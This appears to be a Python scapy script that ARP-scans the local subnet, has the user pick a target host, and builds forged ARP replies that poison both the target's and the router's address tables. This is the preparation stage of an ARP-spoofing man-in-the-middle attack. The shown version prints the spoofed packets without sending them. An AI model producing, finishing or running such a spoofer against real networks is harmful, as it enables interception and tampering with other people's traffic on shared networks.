#! /bin/python
import scapy.all as scapy
import subprocess
import argparse
import re

def get_input():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Desired Interface")
    args = parser.parse_args()
    interface = args.interface
    if not args.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    else:
        return(interface)

def get_router_ip(interface):
    ifconfig_result = subprocess.check_output(["ifconfig",interface]).decode("utf-8")
    router_ip = str(re.search(r"inet ()\d*[.]\d*[.]\d*[.]",ifconfig_result).group(0)[5:]+"1")
    return(router_ip)

def scan(router_ip):
    ip_scan_range = str(router_ip + "/24")
    arp_request = scapy.ARP(pdst=ip_scan_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    scan_result_list = scapy.srp(arp_request_broadcast,verbose=False,timeout=1)[0]
    return(scan_result_list)

def format_output(scan_result_list):
    scan_result_dict = []
    for device in scan_result_list:
        scan_result_dict.append({"ip":device[1].psrc,"mac":device[1].hwsrc})
    return(scan_result_dict)

def get_target_ip(scan_result_dict):
    print("-------------------------------------------------")
    print("IP\t\t\t\tMAC")
    print("-------------------------------------------------")
    for device in scan_result_dict:
        print(device["ip"]+"\t\t\t"+device["mac"])
    target_ip = input("Please specify the target IP: ")
    return(target_ip)

def get_mac_addresses(router_ip,target_ip,scan_result_dict):
    router_mac = list(filter(lambda router: router['ip'] == router_ip, scan_result_dict))[0]["mac"]
    target_mac = list(filter(lambda target: target['ip'] == target_ip, scan_result_dict))[0]["mac"]
    return([router_mac,target_mac])

def prepare_packets(target_ip,target_mac,router_ip,router_mac):
    target_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    router_packet = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip)
    print("-------------------------------------------------")
    print("Target Packet")
    print("-------------------------------------------------")
    print(target_packet.show())
    print(target_packet.summary())
    print("-------------------------------------------------")
    print("Router Packet")
    print("-------------------------------------------------")
    print(router_packet.show())
    print(router_packet.summary())

def main():
    interface = get_input()
    router_ip = get_router_ip(interface)
    scan_result_list = scan(router_ip)
    scan_result_dict = format_output(scan_result_list)
    target_ip = get_target_ip(scan_result_dict)
    mac_addresses = get_mac_addresses(router_ip,target_ip,scan_result_dict)
    router_mac = mac_addresses[0]
    target_mac = mac_addresses[1]
    prepare_packets(target_ip,target_mac,router_ip,router_mac)

main()
